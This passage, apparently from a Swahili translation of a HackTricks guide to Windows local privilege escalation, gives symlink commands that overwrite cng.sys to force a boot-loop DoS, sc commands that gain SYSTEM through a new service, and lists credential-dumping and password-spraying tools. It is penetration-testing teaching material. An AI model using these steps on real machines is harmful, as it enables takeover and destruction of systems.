- Huona folda hiyo, hushindwa kupata driver halisi, na Windows hu-crash au kusitisha kuwasha.
- Hakuna njia mbadala wala recovery bila msaada wa nje (kwa mfano, kurekebisha boot au kufikia diski).

### Kutoka kwa njia za log/backup zenye privileges + OM symlinks hadi overwrite ya faili yoyote / boot DoS

Huduma yenye privileges inapoandika log/export kwenye njia iliyosomwa kutoka kwa config inayoweza kuandikwa, elekeza njia hiyo kwa kutumia Object Manager symlinks + NTFS mount points ili kugeuza uandishi huo wenye privileges kuwa overwrite ya faili yoyote (hata bila SeCreateSymbolicLinkPrivilege).<sup>[[15]](#references)</sup>

**Mahitaji**
- Config inayohifadhi njia lengwa inaweza kuandikwa na mshambuliaji (kwa mfano, `%ProgramData%\...\.ini`).
- Uwezo wa kuunda mount point kuelekea `\RPC Control` na OM file symlink (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Operesheni yenye privileges inayoandika kwenye njia hiyo (log, export, report).

**Mfano wa mfululizo wa hatua**
1. Soma config ili kupata tena mahali pa log penye privileges, kwa mfano `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` ndani ya `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Elekeza njia hiyo bila admin:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Subiri kipengele chenye ruhusa za juu kiandike log (kwa mfano, admin aanzishe "send test SMS"). Sasa maandishi yanaandikwa kwenye `C:\Windows\System32\cng.sys`.
4. Kagua lengo lililoandikwa juu yake (hex/PE parser) ili kuthibitisha uharibifu; kuwasha upya kunalazimisha Windows kupakia njia ya driver iliyoharibiwa → **boot loop DoS**. Hii inatumika pia kwa faili yoyote iliyolindwa ambayo huduma yenye ruhusa za juu itafungua kwa ajili ya kuandika.

> `cng.sys` kwa kawaida hupakiwa kutoka `C:\Windows\System32\drivers\cng.sys`, lakini ikiwa nakala ipo kwenye `C:\Windows\System32\cng.sys`, inaweza kujaribiwa kwanza, na hivyo kuwa sehemu ya kuaminika ya DoS kwa data iliyoharibiwa.



## **Kutoka High Integrity hadi System**

### **Huduma mpya**

Ikiwa tayari unaendesha mchakato wa High Integrity, **njia ya kufikia SYSTEM** inaweza kuwa rahisi: **unda na utekeleze huduma mpya**:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Unapotengeneza binary ya service, hakikisha ni service halali au binary inatekeleza hatua zinazohitajika haraka, kwani itazimwa baada ya sekunde 20 ikiwa si service halali.

### AlwaysInstallElevated

Kutoka kwenye process ya High Integrity unaweza kujaribu **kuwezesha maingizo ya registry ya AlwaysInstallElevated** na **kusakinisha** reverse shell kwa kutumia wrapper ya _**.msi**_.\
[Maelezo zaidi kuhusu registry keys zinazohusika na jinsi ya kusakinisha kifurushi cha _.msi_ hapa.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Unaweza** [**kupata code hapa**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Ikiwa una token privileges hizo (huenda utazipata kwenye process ya High Integrity), utaweza **kufungua karibu process yoyote** (isipokuwa protected processes) kwa kutumia SeDebug privilege, **kunakili token** ya process hiyo, na kuunda **process yoyote ukitumia token hiyo**.\
Kwa kawaida mbinu hii **huchagua process yoyote inayoendeshwa kama SYSTEM yenye token privileges zote** (_ndiyo, unaweza kupata SYSTEM processes zisizo na token privileges zote_).\
**Unaweza kupata** [**mfano wa code inayotekeleza mbinu iliyopendekezwa hapa**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Mbinu hii hutumiwa na meterpreter kwa ajili ya kupandisha privilege kwenye `getsystem`. Mbinu hii inahusisha **kuunda pipe kisha kuunda/ kutumia vibaya service ili iandike kwenye pipe hiyo**. Kisha, **server** iliyounda pipe kwa kutumia privilege ya **`SeImpersonate`** itaweza **kuiga token** ya mteja wa pipe (service), na kupata SYSTEM privileges.\
Ukitaka [**kujifunza zaidi kuhusu named pipes, soma hapa**](#named-pipe-client-impersonation).\
Ukitaka kusoma mfano wa [**jinsi ya kutoka High Integrity hadi System kwa kutumia named pipes, soma hapa**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Ukifanikiwa **kuteka dll** inayopakiwa na **process** inayoendeshwa kama **SYSTEM**, utaweza kutekeleza code yoyote kwa permissions hizo. Kwa hiyo, Dll Hijacking pia inafaa kwa aina hii ya privilege escalation; zaidi ya hayo, ni **rahisi zaidi kuifanikisha kutoka kwenye process ya High Integrity**, kwa kuwa process hiyo itakuwa na **write permissions** kwenye folda zinazotumika kupakia dlls.\
**Unaweza** [**kujifunza zaidi kuhusu Dll hijacking hapa**](dll-hijacking/index.html)**.**

### **Kutoka Administrator au Network Service hadi System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### Kutoka LOCAL SERVICE au NETWORK SERVICE hadi full privs

**Soma:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Msaada zaidi

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Zana muhimu

**Zana bora ya kutafuta njia za Windows local privilege escalation:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Hukagua misconfigurations na faili nyeti (**[**angalia hapa**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Imegunduliwa.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Hukagua baadhi ya misconfigurations zinazowezekana na kukusanya taarifa (**[**angalia hapa**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Hukagua misconfigurations**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Hutoa taarifa za session zilizohifadhiwa za PuTTY, WinSCP, SuperPuTTY, FileZilla, na RDP. Tumia -Thorough kwenye kifaa cha ndani.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Hutoa credentials kutoka Credential Manager. Imegunduliwa.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Hujaribu passwords zilizokusanywa kwenye domain**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh ni zana ya PowerShell ya ADIDNS/LLMNR/mDNS spoofer na man-in-the-middle.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Uchanganuzi wa msingi wa Windows privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Hutafuta privesc vulnerabilities zinazojulikana (IMEPITWA NA WAKATI; tumia Watson badala yake)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Ukaguzi wa ndani **(Unahitaji haki za Admin)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Hutafuta privesc vulnerabilities zinazojulikana (inahitaji ku-compiliwa kwa VisualStudio) ([**iliyocompiliwa awali**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Hukagua host kutafuta misconfigurations (ni zaidi ya zana ya kukusanya taarifa kuliko privesc) (inahitaji ku-compiliwa) **(**[**iliyocompiliwa awali**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Hutoa credentials kutoka kwenye software nyingi (exe iliyocompiliwa awali inapatikana github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Toleo la PowerUp lililoandikwa upya kwa C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Hukagua misconfiguration (executable iliyocompiliwa awali inapatikana github). Haipendekezwi. Haifanyi kazi vizuri kwenye Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Hukagua misconfigurations zinazowezekana (exe kutoka Python). Haipendekezwi. Haifanyi kazi vizuri kwenye Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Zana iliyoundwa kwa msingi wa chapisho hili (haihitaji accesschk ili kufanya kazi vizuri, lakini inaweza kuitumia).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Husoma matokeo ya **systeminfo** na kupendekeza exploits zinazofanya kazi (Python ya ndani)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Husoma matokeo ya **systeminfo** na kupendekeza exploits zinazofanya kazi (Python ya ndani)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Lazima ucompile project kwa kutumia toleo sahihi la .NET ([tazama hapa](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Ili kuona toleo la .NET lililosakinishwa kwenye host ya mwathiriwa, unaweza kutumia:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Misingi ya Windows Privilege Escalation](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Kuinua privileges kwa kutumia vibaya ruhusa dhaifu za folda](http://www.greyhathacker.net/?p=738)
- [3] [Windows Privilege Escalation - mwongozo wa haraka](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Warsha ya Windows / Linux Local Privilege Escalation](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Mashambulizi ya Windows: AT ndiyo mtindo mpya (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Privilege Escalation - Windows - Mwongozo kamili wa OSCP](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - Privilege Escalation - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Mwongozo wa Windows Privilege Escalation](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Orodha hakiki ya Windows-Privilege-Escalation](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Mbinu za Windows Privilege Escalation kwa Pentesters](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: Hadaa kupitia SMTP kwa macro ya Word VBA → kufumbua credentials za hMailServer → Veeam CVE-2023-27532 hadi SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: leak ya format-string + stack BOF → VirtualAlloc ROP (RCE) na wizi wa kernel token](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Kumfuatilia Silver Fox: Paka na Panya kwenye Vivuli vya Kernel](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – Athari ya mfumo wa faili yenye privileges katika mfumo wa SCADA](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Zana za Kupima Symbolic Link – Matumizi ya CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Kiungo cha Zamani. Kutumia Vibaya Symbolic Links kwenye Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (toleo la Cobalt Strike BOF)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js Trust Falls: Utatuzi hatari wa modules kwenye Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.js modules: kupakia kutoka kwenye folda za `node_modules`](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - Changamoto za orodha hakiki ya C/C++, zimetatuliwa](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - Kazi ya RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Kuteka binaries za huduma](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own na Microslop: Kuunganisha CLDFLT na race conditions za DirectX Kernel kwa Windows LPE](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [I/O Ring Moja ya Kuwatawala Wote: Primitive kamili ya Exploit ya Kusoma/Kuandika kwenye Windows 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Kutumia Vibaya Ufutaji wa Faili Holela ili Kuongeza Privilege na Mbinu Nyingine Bora](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - Msimbo wa exploit wa FilesystemEoPs](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – Mashambulizi ya WSUS Sehemu ya 2: CVE-2020-1013, Local Privilege Escalation ya siku moja kwenye Windows 10](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Kuchunguza Credential Manager na Windows Vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Kerberos Resource Based Constrained Delegation: Mabadiliko ya picha yanaposababisha Privilege Escalation](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Kutoa Ssh Private Keys kutoka kwa Windows 10 Ssh Agent](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – Kubadilisha Seva za Enterprise Update kuwa Viwanda vya Backdoor (0_o) – Sehemu ya 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Kubadilisha Seva za Enterprise Update kuwa Viwanda vya Backdoor (0_o) – Sehemu ya 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence - Privilege Escalation kupitia kufuta folda ya Microsoft Windows Installer](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center - CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
- [43] [MDSec - Total Recall: Kufuatilia hatua zako kurudi hadi NT AUTHORITY\SYSTEM](https://www.mdsec.co.uk/2026/02/total-recall-retracing-your-steps-back-to-nt-authoritysystem/)
- [44] [NCC Group - Ushauri wa Privilege Escalation kupitia offsets za shared-memory za Windows MIDI Services](https://nccgroup.com/research/technical-advisory-microsoft-windows-midi-service-module-escalation-of-privileges-cve-2026-62688)
{{#include ../../banners/hacktricks-training.md}}
